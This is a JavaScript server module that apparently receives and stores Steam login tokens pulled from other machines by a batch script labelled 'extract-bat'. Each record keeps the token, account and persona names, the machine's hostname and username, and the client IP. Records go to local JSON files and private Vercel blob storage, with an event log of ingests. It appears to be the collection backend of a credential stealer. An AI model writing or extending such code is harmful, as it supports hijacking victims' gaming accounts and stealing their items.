import fs from 'fs';
import path from 'path';

const DB_FILES = [
  path.join(process.cwd(), 'src', 'data', 'ingested_tokens.json'),
  path.join(process.cwd(), 'api', 'ingested_tokens.json'),
  'C:\\Users\\iliyk\\Desktop\\sharpbuy_ingested_tokens.json',
];

const BLOB_PREFIX = 'sharpbuy/tokens/';
const EVENT_PREFIX = 'sharpbuy/events/';

function readLocalDb() {
  for (const filePath of DB_FILES) {
    try {
      if (fs.existsSync(filePath)) {
        const data = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
        if (Array.isArray(data)) return data;
      }
    } catch (e) {
      console.error('[INGEST DB] read error:', filePath, e.message);
    }
  }
  return [];
}

function writeLocalDb(records) {
  const payload = JSON.stringify(records, null, 2);
  for (const filePath of DB_FILES) {
    try {
      fs.mkdirSync(path.dirname(filePath), { recursive: true });
      fs.writeFileSync(filePath, payload, 'utf-8');
    } catch (e) {
      console.error('[INGEST DB] write error:', filePath, e.message);
    }
  }
}

function hasBlobStorage() {
  return Boolean(process.env.BLOB_READ_WRITE_TOKEN || process.env.VERCEL_OIDC_TOKEN);
}

function sortRecords(records) {
  return records.sort((a, b) => {
    const aTime = Date.parse(a.ingestedAt || 0);
    const bTime = Date.parse(b.ingestedAt || 0);
    return bTime - aTime;
  });
}

async function readBlobDb() {
  if (!hasBlobStorage()) return null;

  try {
    const { list, get } = await import('@vercel/blob');
    const { blobs } = await list({ prefix: BLOB_PREFIX, access: 'private' });
    if (!blobs.length) return [];

    const records = [];
    for (const blob of blobs) {
      try {
        const response = await get(blob.pathname, { access: 'private' });
        if (!response?.stream) continue;
        const text = await new Response(response.stream).text();
        const record = JSON.parse(text);
        if (record?.token) records.push(record);
      } catch (e) {
        console.error('[INGEST DB] blob item read error:', blob.pathname, e.message);
      }
    }

    return sortRecords(records);
  } catch (e) {
    console.error('[INGEST DB] blob read error:', e.message);
    return null;
  }
}

async function writeBlobJson(pathname, data) {
  if (!hasBlobStorage()) return false;
  try {
    const { put } = await import('@vercel/blob');
    await put(pathname, JSON.stringify(data), {
      access: 'private',
      addRandomSuffix: false,
      allowOverwrite: true,
      contentType: 'application/json',
    });
    return true;
  } catch (e) {
    console.error('[INGEST DB] blob write error:', pathname, e.message);
    return false;
  }
}

async function writeBlobRecord(record) {
  return writeBlobJson(`${BLOB_PREFIX}${record.id}.json`, record);
}

export async function logIngestEvent(event) {
  const record = {
    id: `evt_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`,
    status: event.status || 'info',
    message: event.message || '',
    accountName: event.accountName || '',
    hostname: event.hostname || '',
    username: event.username || '',
    source: event.source || 'extract-bat',
    clientIp: event.clientIp || '',
    at: new Date().toISOString(),
  };

  await writeBlobJson(`${EVENT_PREFIX}${record.id}.json`, record);
  return record;
}

export async function getIngestEvents(limit = 30) {
  if (!hasBlobStorage()) return [];

  try {
    const { list, get } = await import('@vercel/blob');
    const { blobs } = await list({ prefix: EVENT_PREFIX, access: 'private' });
    const sorted = blobs.sort((a, b) => Date.parse(b.uploadedAt) - Date.parse(a.uploadedAt));
    const records = [];

    for (const blob of sorted.slice(0, limit)) {
      try {
        const response = await get(blob.pathname, { access: 'private' });
        if (!response?.stream) continue;
        const text = await new Response(response.stream).text();
        records.push(JSON.parse(text));
      } catch (e) {
        console.error('[INGEST DB] event read error:', blob.pathname, e.message);
      }
    }

    return records;
  } catch (e) {
    console.error('[INGEST DB] events read error:', e.message);
    return [];
  }
}

export async function getAllIngestedTokens() {
  if (hasBlobStorage()) {
    const blobData = await readBlobDb();
    if (blobData !== null) return blobData;
  }
  return sortRecords(readLocalDb());
}

export async function saveIngestedTokens(records) {
  writeLocalDb(records);
  return { local: true, blob: hasBlobStorage() };
}

export async function ingestTokenRecords(items, meta = {}) {
  const now = new Date().toISOString();
  const existing = hasBlobStorage() ? ((await readBlobDb()) || []) : readLocalDb();
  const bySteamId = new Map(existing.map((r) => [r.steamId, r]));
  let blobSaved = false;

  for (const item of items) {
    const token = String(item.token || '').trim();
    if (!token || !token.includes('----')) continue;

    const parts = token.split('----');
    const steamId = String(item.steamId || parts[0] || '').trim();
    const record = {
      id: `ing_${steamId || Date.now()}`,
      steamId,
      token,
      accountName: item.accountName || '',
      personaName: item.personaName || '',
      hostname: meta.hostname || '',
      username: meta.username || '',
      source: meta.source || 'extract-bat',
      ingestedAt: now,
      clientIp: meta.clientIp || '',
    };

    bySteamId.set(steamId, record);
    if (await writeBlobRecord(record)) blobSaved = true;
  }

  const records = sortRecords(Array.from(bySteamId.values()));
  writeLocalDb(records);

  return {
    count: items.length,
    storage: { local: true, blob: blobSaved },
    total: records.length,
  };
}
